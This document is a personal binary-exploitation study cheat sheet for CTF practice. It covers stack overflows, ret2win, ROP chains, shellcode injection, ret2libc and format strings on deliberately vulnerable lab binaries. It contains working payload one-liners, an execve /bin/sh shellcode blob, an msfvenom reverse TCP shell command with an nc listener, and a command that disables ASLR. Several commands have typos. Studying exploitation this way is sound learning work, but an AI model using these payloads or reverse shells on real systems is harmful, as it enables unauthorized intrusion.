______________
Resource
______________
https://ghidra-sre.org/CheatSheet.html
https://guyinatuxedo.github.io/01-intro_assembly/assembly/index.html
https://ir0nstone.gitbook.io/notes/binexp/stack

https://github.com/Crypto-Cat/CTF      === practising



---------
notes
---------
file <vuln>
checksec --file <vuln>
gcc <vuln.c> -o <vuln> -fno-stack-protector -z execstack -no-pie -m32
gcc overwrite.c -o overwrite -fno-stack-protector -z execstack -no-pie -m32 -Wno-implicit-function-declaration
r2 ret2win
	-aa
	-/c ret
	-afl
	-pdf @main
	-ds
gdb-pwndbg
	-file <vuln>
	-disassemble <main>
	-info stack
	-info functions
	-x $eax
	-x $eax - 0xc
	-set *0xffffce9c = 1 (or) x $eax - 0xc = 1
	-p $eax
	-n    == next
	-c    == continue
	-delete breakpoints
	-run
	-break <*main+140> or <*0x08049222>
	-cyclic 100
	-cyclic -l <haaa>
	
ropper --file <vuln>
r2 <vuln>
	-afl   == to list functions
	-s <main> ----> pdf   == to see the function
	-v

ltrace <login>
strace <login>
	
unhex

EIP is the Instruction Pointer, which points to the next instruction to be executed.
ESP is the Stack Pointer, which points to the top of the current stack. The stack is used for storing local variables, function return addresses, and control flow information.
EBP is the Base Pointer, which points to the base of the current stack frame.

-calling functions with no param
	-0x08049186 \x86\x91\x04\x08
	-python2 -c 'print "A" * 28 + "\x86\x91\x04\x08"'
	AAAAAAAAAAAAAAAAAAAAAAAAAAAA��
	
##32 bit
-codebabe and deadbeef was in the stack to comapre 
--EBP, ERP, EIP
-calling function with 2 param
	-python2 -c 'print "A" * 28 + "\x86\x91\x04\x08"+ "AAAA" + "\xef\xbe\xad\xde" + "\xbe\xba\xde\xc0"' +  > payload_ret_par

-***Ropstar

##64bit
-it uses registers(mv to stack) and compare
-it cuz of cononical address
-RBP, RSP, RIP
-cyclic does not popualte in RIP so we the 1st 4 bit 'gaaa'

- 	rdi- 1st param
	rsi - 2nd param
	rdx - 3rd param
	rcx - 4th param
	r8 - 5th param 
	r9 - 6th param

-padding + pop_rdi + param1 + pop_rsi->r15 + param2 + junk + hacked

-python2 -c 'print "A" * 24 + "<pop rdi>" + "\xef\xbe\xad\xde\xef\xbe\xad\xde" + "<pop rsi-> r15> "+ "\xbe\xba\xde\xc0\xbe\xba\xde\xc0"+ "\x00\x00\x00\x00\x00\x00\x00\x00" +  "\x86\x91\x04\x08"' +  > payload_ret_par2


-use ropper --file <ret> --search <"pop rdi">
-or use ROPgadget --banary <vuln> | grep rdi

0x0000000000401142 - hacked
0x000000000040124b - pop rdi
0xdeadbeefdeadbeef - param 1
0x0000000000401249 - pop rsi ; pop r15	
0xc0debabec0debabe - param 2

python2 -c 'print "A" * 24 + "\x4b\x12\x40\x00\x00\x00\x00\x00" + "\xef\xbe\xad\xde\xef\xbe\xad\xde" + "\x49\x12\x40\x00\x00\x00\x00\x00" + "\xbe\xba\xde\xc0\xbe\xba\xde\xc0" + "\x00\x00\x00\x00\x00\x00\x00\x00" + "\x42\x11\x40\x00\x00\x00\x00\x00"' 


Injecting Shellcode (Shellcraft/MSFVenom)
-sudo chown root:root flag.txt
-chmod 600 flag.txt 
-sudo chown root:root server
-sudo chmod 4655 server 

--------------------------------------
1.Overwriting Variables on the Stack
--------------------------------------
-gcc 
--fno-stack-protecror --> no canary 
--z execstack  --> nx disabled
--no-pie --> no pie
--m32 --> 32-bit

-ltrace ./login

-x $eax
-x $eax - 0xc
-set *0xffffce9c = 1 (or) x $eax - 0xc = 1
-p $eax
-n    == next
-c    == continue

-LSB --> it refers to the lowest bit in a binary representation of a number

print2 -c 'print 32 * "A" + "\xef\xbe\xad\xde"'



---------------------------
2.Return to Win (Ret2Win)
---------------------------
===================
without param
===================
-r2 <ret2win>,--> aa, --> afl
-if pie is enabled --> the addresses will change, but offset will be the same
-calling functions with no param
	-0x08049186 \x86\x91\x04\x08
	-python2 -c 'print "A" * 28 + "\x86\x91\x04\x08"'
===================
with param
===================
##32 bit
-codebabe and deadbeef was in the stack to comapre 
--EBP, ERP, EIP
-calling function with 2 param
	-python2 -c 'print "A" * 28 + "\x86\x91\x04\x08"+ "AAAA" + "\xef\xbe\xad\xde" + "\xbe\xba\xde\xc0"'
##64bit
-it uses registers(mv to stack) and compare --> rdi, rsi
-use rop gadgets
-it cuz of cononical address
-RBP, RSP, RIP
-cyclic does not popualte in RIP so we the 1st 4 bit 'gaaa'

- 	rdi- 1st param
	rsi - 2nd param
	rdx - 3rd param
	rcx - 4th param
	r8 - 5th param 
	r9 - 6th param

-padding + pop_rdi + param1 + pop_rsi->r15 + param2 + junk + hacked

-python2 -c 'print "A" * 24 + "<pop rdi>" + "\xef\xbe\xad\xde\xef\xbe\xad\xde" + "<pop rsi-> r15> "+ "\xbe\xba\xde\xc0\xbe\xba\xde\xc0"+ "\x00\x00\x00\x00\x00\x00\x00\x00" +  "\x86\x91\x04\x08"' +  > payload_ret_par2


-use ropper --file <ret> --search <"pop rdi">
-or use ROPgadget --banary <vuln> | grep rdi

0x0000000000401142 - hacked
0x000000000040124b - pop rdi
0xdeadbeefdeadbeef - param 1
0x0000000000401249 - pop rsi ; pop r15	
0xc0debabec0debabe - param 2

python2 -c 'print "A" * 24 + "\x4b\x12\x40\x00\x00\x00\x00\x00" + "\xef\xbe\xad\xde\xef\xbe\xad\xde" + "\x49\x12\x40\x00\x00\x00\x00\x00" + "\xbe\xba\xde\xc0\xbe\xba\xde\xc0" + "\x00\x00\x00\x00\x00\x00\x00\x00" + "\x42\x11\x40\x00\x00\x00\x00\x00"' 








---------------------------------
injecting shellcode
---------------------------------
	
-if NX disabled

python2 -c 'print "A" * 76 + "B(jmp esp)" * 4 + "C(malicious code here)"*100' --> malicious code at ESP 

shellcraft --list
shellcraft i386.linux.sh -f a   --> to get a rev shell -->
6a68682f2f2f73682f62696e89e368010101018134247269010131c9516a045901e15189e131d26a0b58cd80

msfvenom
msfvenom -p linx/x86/shell reverse tcp LHOST=127.0.0.1 LPORT==4444 -f python
then => nc -nlvp 4444

ropper --file secureserver --search "jmp esp" --> 0x0804919f: jmp esp;
\x9f\x91\x04\x08

python2 -c 'print "nop" * 76 + "\x9f\x91\x04\x08" + "nop" * 16 + "\x80\xcd\x58\x0b\x6a\xd2\x31\xe1\x89\x51\xe1\x01\x59\x04\x6a\x51\xc9\x31\x01\xe1\x69\x72\x24\x34\x81\x01\x01\x01\x68\xe3\x89\x6e\x69\x2f\x68\x73\x2f\x2f\x2f\x68\x68\x6a
"'

------------------------------------------
Return to Lib-C (ret2system/one_gadget)
------------------------------------------
=======
32-bit
=======
-dynamically linked
-lib c library--> get, put, printf
-aslr will randomise addresses
-Global Offset Table-->In dynamically linked binaries (like those that use shared libraries), the GOT stores the addresses of functions and data located outside the binary (such as printf or strcpy from libc).
-Procedure Linkage Table-->When a function like printf is called, the PLT uses the GOT to locate the actual address of printf in memory.

1. Find EIP offset
2. search -t string "bin/sh"
	-ldd <vuln>
	-disabling aslr --> echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
	-readelf -s <lib c library> | grep system
	-strings -a -t x <lib c library> | grep "bin/sh"

=======
64-bit
=======
-finding cyclic in RSP first 8bytes
-find POP RDI	
	-ropper --file <file> --search "pop rdi"
-search:
	-ldd <vuln>
	-readelf -s <lib c library> | grep system
	-strings -a -t x <lib c library> | grep "bin/sh"
	-gem --> one_gadget


------------------------------------------
Format String Vulnerabilities (printf)
------------------------------------------
%x, %c, %p, %d, %10$x




















